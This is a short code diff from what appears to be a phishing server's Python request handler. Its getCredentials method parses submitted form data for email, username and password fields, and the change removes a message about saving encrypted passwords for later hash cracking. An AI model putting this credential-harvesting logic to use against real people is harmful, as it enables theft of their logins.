@@ -128,9 +128,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def getCredentials(self, values):
         post = unquote(values.decode('utf-8'))
         readpost = post.strip('&')
-        if 'enc' in readpost:
-          print(BOLD+GREEN+f"\n[!] Possibly the password went through an encryption algorithm before sending\nSaving file {BLUE}post.txt{GREEN} for future hash crack\n"+ENDC)
-        
+
         forms = ['email','user','pass','encpass','enc_password'] #Possibles forms to get the credentials
         
         readpost = readpost.split('&')
